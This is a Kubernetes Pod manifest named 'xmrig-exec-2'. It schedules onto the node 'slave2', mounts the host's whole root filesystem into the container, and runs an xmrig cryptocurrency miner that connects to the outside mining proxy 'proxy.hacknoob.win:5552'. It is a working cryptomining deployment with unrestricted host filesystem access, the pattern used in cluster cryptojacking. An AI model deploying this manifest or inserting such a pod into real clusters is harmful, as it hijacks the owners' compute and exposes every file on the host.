apiVersion: v1
kind: Pod
metadata:
  name: xmrig-exec-2
spec:
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchExpressions:
          - key: kubernetes.io/hostname
            operator: In
            values:
            - slave2
  containers:
  - name: xmrig-container-1
    image: busybox
    command:
    - /home/worker2/xmrig/build/xmrig
    - -o
    - proxy.hacknoob.win:5552
    - -u
    - slave2
    - --cpu-no-yield
    - --nicehash
    - --threads=2
    volumeMounts:
    - name: xmrig-volume-2
      mountPath: /
  volumes:
  - name: xmrig-volume-2
    hostPath:
      path: /
